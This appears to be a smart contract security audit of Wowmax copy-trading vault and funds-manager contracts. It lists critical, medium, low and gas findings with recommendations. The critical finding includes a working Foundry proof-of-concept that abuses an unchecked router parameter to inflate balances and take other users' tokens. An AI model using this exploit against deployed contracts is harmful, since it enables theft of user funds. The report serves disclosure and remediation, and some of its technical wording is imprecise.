
# [C-01] WowmaxCopyTradingFundsManager::`_swapOneToMany/_swapManyToOne` - Calling a malicious contract 

## Description 
The `WowmaxCopyTradingFundsManager` contract contains a critical vulnerability that allows arbitrary external contract calls through the router parameter in the `MultiSwap` struct. This vulnerability enables attackers to call any contract address instead of being restricted to legitimate swap routers.
## Vulnerability Details
The vulnerability exists in these functions - `_swapOneToMany`  and `_swapManyToOne`.
```solidity 
    function _swapManyToOne(MultiSwap calldata multiSwap) private returns (uint256 amountOut) {
     //...code  
      IERC20(tokenIn).safeIncreaseAllowance(multiSwap.router, amountIn);
=>           (bool success, ) = multiSwap.router.call(multiSwap.swaps[i].swapData);
            require(success, "Funds Manager: swap failed");
            balanceAfter = IERC20(multiSwap.token).balanceOf(address(this));
            swapAmountOut = balanceAfter - balanceBefore;
            require(swapAmountOut >= multiSwap.swaps[i].minAmountOut, "Funds Manager: insufficient output amount");
            balanceBefore = balanceAfter;
            amountOut += swapAmountOut;
        }
        return amountOut;
    }

    function _swapOneToMany(MultiSwap calldata multiSwap) private returns (uint256[] memory amountsOut) {
        //...code
        IERC20(multiSwap.token).safeTransferFrom(msg.sender, address(this), amountIn);
        IERC20(multiSwap.token).safeIncreaseAllowance(multiSwap.router, amountIn);
        uint256 balanceBefore;
        uint256 balanceAfter;
        for (uint256 i = 0; i < multiSwap.swaps.length; i++) {
            balanceBefore = IERC20(multiSwap.swaps[i].token).balanceOf(address(this));

=>          (bool success, ) = multiSwap.router.call(multiSwap.swaps[i].swapData);
            require(success, "Funds Manager: swap failed");
            balanceAfter = IERC20(multiSwap.swaps[i].token).balanceOf(address(this));

            amountsOut[i] = balanceAfter - balanceBefore;

            require(amountsOut[i] >= multiSwap.swaps[i].minAmountOut, "Funds Manager: insufficient output amount");
        }
    }
```
A regular user can call the following functions `swapOneToMany` , `swapManyToOne` and pass any address as an argument instead of a trusted router. This is possible because there are no checks or restrictions.

## Proof of Concept
Let's consider one scenario. An attacker will pass the `WowmaxCopyTradingVault` address as the router address and try to increase the leader's balance for a specific token. If the attacker first makes a deposit for a specific leader, then calls one of these functions to artificially increase the number of tokens for the leader, and then withdraws all tokens, the attacker will be able to take some of the tokens from other users. When withdrawing, the number of tokens withdrawn is calculated as the product of the shares and the leader's total token balance. Even if the attacker deposits only one `tokenA`, and the leader has both `tokenA` and `tokenB`, the attacker will receive a share of `tokenA` and token B, respectively, upon withdrawal.
```solidity 
  function test_Router() public {
        address[] memory allowedTokens = new address[](5);
        allowedTokens[0] = address(wbtc);
        allowedTokens[1] = address(uni);
        allowedTokens[2] = address(pepe);
        allowedTokens[3] = address(weth);
        allowedTokens[4] = address(usdt);

        vault.allowTokens(allowedTokens);

        ///-------balanceOf leader before-----
        assertEq(vault.balances(leader, address(weth)), 0);
        assertEq(vault.balances(leader, address(usdt)), 0);

        //------------
        vm.startPrank(follower);
        weth.approve(address(fundsManager), 1 ether);
        usdt.approve(address(fundsManager), 1 ether);
        bytes memory swapData = abi.encodeWithSelector(
            WowmaxCopyTradingVault.copyTradeDeposit.selector,
            leader,
            weth,
            1 ether
        );
        IWowmaxCopyTradingFundsManager.Swap[] memory swaps = new IWowmaxCopyTradingFundsManager.Swap[](1);
        swaps[0] = IWowmaxCopyTradingFundsManager.Swap({
            amount: 2,
            token: address(weth),
            minAmountOut: 0,
            swapData: swapData
        });
        fundsManager.swapOneToMany(
            IWowmaxCopyTradingFundsManager.MultiSwap({
                router: address(vault),
                token: address(usdt),
                swaps: swaps,
                deadline: block.timestamp + 3600
            }),
            follower
        );

        // -----balanceOf leader after
        assertEq(vault.balances(leader, address(weth)), 1 ether);
    }
```

Test result: 
```bash 
forge test --mt test_Router -vv 

Ran 1 test for test/WowmaxTest.t.sol:WowmaxCopyTradingTest
[PASS] test_Router() (gas: 367468)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.07ms (1.88ms CPU time)

Ran 1 test suite in 272.74ms (13.07ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact

- Execution of arbitrary functions on any contract
- Reentrancy Attacks
- Access Control Bypass

## Recommendation
Add a whitelist with legitimate router addresses and consider adding protection against reentrancy attacks.

# [M-01]  Use `safeTransfer()` and `safeTransferFrom()` Instead of `transfer()` and `transferFrom()`

## Description

Tokens that do not comply with the ERC20 specification could return false from the transfer function call to indicate the transfer fails, while the calling contract would not notice the failure if the return value is not checked. Checking the return value is a requirement, as written in the EIP-20 specification:
"Callers MUST handle false from returns (bool success). Callers MUST NOT assume that  false is never returned!"
Some tokens do not return a bool (e.g. USDT, BNB, OMG) on ERC20 methods. This will make the call break, making it impossible to use these tokens.

## Location of Affected Code

`WowmaxCopyTradingVault`:

- `makeDeposit()`
```solidity
IERC20(deposit.amounts[i].token).transferFrom(msg.sender, address(this), deposit.amounts[i].value); 
```

- `withdraw()`
```solidity
IERC20(token).transfer(msg.sender, amount);
```

- `withdrawForSwap()`
```solidity
    IERC20(tokens[i]).transfer(msg.sender, amounts[i]);
```

- `copyTradeWithdraw()`
```solidity
IERC20(tokens[i]).transfer(msg.sender, amounts[i]);
```

## Impact

It would not revert even though the transaction failed.

## Recommendation

Use `SafeTransferLib` or `SafeERC20`, replace transfer with `safeTransfer()` and `transferFrom()` with `safeTransferFrom()` when transferring `ERC20` tokens.

# [M-02] Incorrect comparison of the `deadline` for the current price 
## Description
The contract compares a `deadline` value (intended to be in seconds) against `block.number` instead of `block.timestamp`, causing all swap operations to fail due to expired deadlines.
## Vulnerability Details
There is an incorrect comparison in the `_swapOneToMany` and `_swapManyToOne` functions. The NatSpec comment on the `MultiSwap` structure states that the `deadline` is defined in seconds.
```solidity
 function _swapManyToOne(MultiSwap calldata multiSwap) private returns (uint256 amountOut) {
        require(multiSwap.deadline >= block.number, "Funds Manager: expired");
```

```solidity
   /**
     * @notice Multi-swap data structure
     * @param router Address of the router contract to perform the swap
     * @param token Address of the token to be swapped or received, depending on the swap direction
     * @param swaps Array of single swap data, that are executed in order
=>   * @param deadline Deadline of the multi-swap in seconds, after which the swap is considered expired
     */
    struct MultiSwap {
        address router;
        address token;
        Swap[] swaps;
        uint256 deadline;
    }
```
In the `PriceVerifier` contract, another `deadline` value is already being compared with `block.timestamp`. 
```solidity
    function verifyPrices(
        IWowmaxCopyTrading.PriceData calldata priceData,
        address expectedSigner
    ) public view returns (bool) {
        require(priceData.deadline >= block.timestamp, "PriceVerifier: expired deadline"); 
	//...code
```

Since `block.number < block.timestamp`, this check will always return `true`if the deadline is block.timestamp.
## Recommendation
Replace block.number with block.timestamp in both deadline validation checks

# [M-03] `WowmaxCopyTradingVault::withdrawForSwap`Users may not receive their tokens
## Description
If a user makes a deposit from a multisig wallet or abstract account, they will receive a DoS when calling the `multiWithdraw` function.

## Vulnerability Details
The problem is that checking for follower shares is done through mapping `shares[leader][follower]`, but since this function can only be called by the `FundsManager` contract, the follower is defined as `tx.origin`.

```solidity
function withdrawForSwap(
        address leader
    ) external onlyFundsManager returns (address[] memory tokens, uint256[] memory amounts) {
        address follower = tx.origin; 
        require(shares[leader][follower] > 0, "WOWMAX: No shares to withdraw");
```
If users using a multisig wallet or abstract account make a deposit and specify the variable to as the multisig wallet address or abstract contract address, they will not be able to call the `multiWithdraw` function afterwards, since `tx.origin` is the address that initiated the transaction.

## Impact 
- DoS will return
- Users will have to overpay for calling two functions instead of one

## Recommendation
Consider not using `tx.origin`

# [M-04]  Contracts - Fee on Transfer Token Will Break accounting
## Severity

**Impact:** High, because the accounting will be incorrect, and the shares will be affected

**Likelihood:** Low, because fee on transfer token is not commonly used

## Description
Most functions are using `amount` for transfering and accounting.  But fee on transfer token could break the accounting, since the actual token received will be less than amount.

USDT potentially could turn on fee on transfer feature, but not yet.

## Recommendations

Use before and after balance to accurately reflect the true amount received, and update share price accordingly.

# [L-01] Missing checks for address(0)
## Description
In smart contracts, values are assigned to address state variables without checking whether the assigned address is a zero address (address(0)). This omission can lead to unintended behavior and potential security vulnerabilities in the contract.
## Recommendation
To prevent unintended behavior and potential security vulnerabilities, it is essential to include checks for `address(0)` when assigning values to address state variables. This can be achieved by adding a simple check to ensure that the assigned address is not equal to `address(0)` before proceeding with the assignment.

# [L-02]  Resolve all TODOs for production readiness
## Description
All TODOs must be completed and deleted/corrected.

```solidity
//TODO: Remove resque methods before deploying to production 

    /**
     * @dev Rescue ERC20 tokens
     * @param tokens Tokens to rescue
     * @param to Address to send the tokens
     */
    function rescueERC20(address[] calldata tokens, address to) external onlyOwner {
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 token = IERC20(tokens[i]);
            token.safeTransfer(to, token.balanceOf(address(this)));
        }
    }

    /**
     * @dev Rescue ETH
     * @param to Address to send the ETH
     */
    function rescueETH(address to) external onlyOwner {
        payable(to).transfer(address(this).balance);
    }
```
## Recommendation
Please ensure all pending tasks are appropriately tracked and implemented.

# [L-03] Contracts - Lack of Event Emission

## Description

It has been observed that some functionalities are missing from emitting events.

Events are a method of informing the transaction initiator about the actions taken by the called function. It logs its emitted parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. Events help non-contract tools to track changes, and events prevent users from being surprised by changes.

```solidity
// contract WowmaxCopyTradingFundsManager
  function addAllowedRouter(address router) external onlyOwner {
        require(router != address(0), "Funds Manager: invalid router address");
        require(allowedRouters.add(router), "Funds Manager: router already added");
    }

    function removeAllowedRouter(address router) external onlyOwner {
        require(allowedRouters.remove(router), "Funds Manager: router not found");
    }


//contract WowmaxCopyTradingVault
    function allowTokens(address[] calldata tokens) external onlyOwner {
        for (uint256 i = 0; i < tokens.length; i++) {
            allowedTokens.add(tokens[i]);
        }
    } 

    function disallowTokens(address[] calldata tokens) external onlyOwner {
        for (uint256 i = 0; i < tokens.length; i++) {
            allowedTokens.remove(tokens[i]);
        }
    }

    function setFundsManagerAddress(address _fundsManager) external onlyOwner {
        require(_fundsManager != address(0), "WOWMAX: Invalid funds manager address");
        fundsManager = _fundsManager;
    } 


    function setFee(uint256 _fee) external onlyOwner {
        require(_fee <= 1000, "WOWMAX: Fee must be less than or equal to 10%");
        fee = _fee;
    }
```

## Recommendation

All functions updating important parameters should emit events.


# [G-01] Save the value in the hash
## Description
There are many loops in contracts. A loop lasts until  it reaches a certain array length, for example in this function. 
```solidity 
   function _swapOneToMany(MultiSwap calldata multiSwap) private returns (uint256[] memory amountsOut) {
        require(multiSwap.deadline >= block.number, "Funds Manager: expired"); 
        amountsOut = new uint256[](multiSwap.swaps.length);
        uint256 amountIn;
=>      for (uint256 i = 0; i < multiSwap.swaps.length; i++) {
            amountIn += multiSwap.swaps[i].amount; 
        }

        IERC20(multiSwap.token).safeTransferFrom(msg.sender, address(this), amountIn);
        IERC20(multiSwap.token).safeIncreaseAllowance(multiSwap.router, amountIn);
        uint256 balanceBefore;
        uint256 balanceAfter;

=>      for (uint256 i = 0; i < multiSwap.swaps.length; i++) {
            balanceBefore = IERC20(multiSwap.swaps[i].token).balanceOf(address(this));

            (bool success, ) = multiSwap.router.call(multiSwap.swaps[i].swapData); 
            require(success, "Funds Manager: swap failed");
            balanceAfter = IERC20(multiSwap.swaps[i].token).balanceOf(address(this));

            amountsOut[i] = balanceAfter - balanceBefore;

            require(amountsOut[i] >= multiSwap.swaps[i].minAmountOut, "Funds Manager: insufficient output amount");
        }
    }
```
Hash the length to save gas.

## Recommendation
Hash the length of the array and use this variable.
```solidity 
uint256 len = multiSwap.swaps.length;
 for (uint256 i = 0; i < len; i++) {...}
```

# [G-02] `WowmaxCopyTradingVault.sol`- Unused variables

## Description
This contract contains the following unused variables:
```solidity 
IERC20 public immutable stableCoin; 
IWETH public immutable weth;
```

Since these functions are declared as `immutable`, they will cause you to spend more gas when deploying the contract.
## Recommendation
Remove unused variables

# [QA-01] prefer`Ownable2Step` instead of `Ownable`

## Description 
Prefer [Ownable2Step](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol) instead of `Ownable` for [safer ownership transfer](https://www.rareskills.io/post/openzeppelin-ownable2step).


